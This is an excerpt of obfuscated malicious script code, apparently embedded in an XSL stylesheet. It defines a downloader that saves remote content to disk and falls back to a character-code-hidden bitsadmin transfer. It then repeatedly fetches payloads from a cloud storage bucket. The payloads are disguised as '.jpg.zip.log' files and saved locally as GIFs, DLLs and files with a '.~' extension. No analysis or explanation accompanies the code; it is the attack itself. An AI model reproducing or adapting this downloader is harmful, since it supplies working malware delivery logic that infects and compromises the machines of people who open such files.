...
<output method="text"/>
    ...
    function mrc430(url, file)
    {
		...
		try 
		{
			...
			astya56.Type = 1; // binary mode
			astya56.Open();
			astya56.Write(webstuff);
			astya56.SaveToFile(file, 2); // 2 = overwrite existing file
			astya56.Close();
			return true;
		} 
		catch(e) {					
				...
				try
				{		
				 kpz8410.run(String.fromCharCode(98)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(115)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(109)+String.fromCharCode(105)+String.fromCharCode(110)+" /transfer msd5 /priority foreground "+url+" "+file+".z",0,true); 
...
dro73 = false; 
     ...
     ekw28 = "https://storage.googleapis.com/linuxczv/"+ak765;
...
irz593 = "142_T3SL4S_"	
  ...
  { 
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzc.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzc.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtzc.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzc.jpg");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdwwn.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzdwwn.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdwwn.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzdwwn.gif");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdx.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzdx.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdx.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzdx.gif");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzg.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzg.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzg.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzg.gif");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzgx.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzgx.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzgx.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzgx.gif");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxa.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzxa.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxa.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzxa.~");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxb.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzxb.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxb.gif.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzxb.~");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"a.dll.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtz64a.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"a.dll.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtz64a.dll");
	    }
	}
    catch (ex)
    {
	...
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"b.dll.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtz64b.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"b.dll.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtz64b.dll");
	    }
	}
    catch (ex)
    {
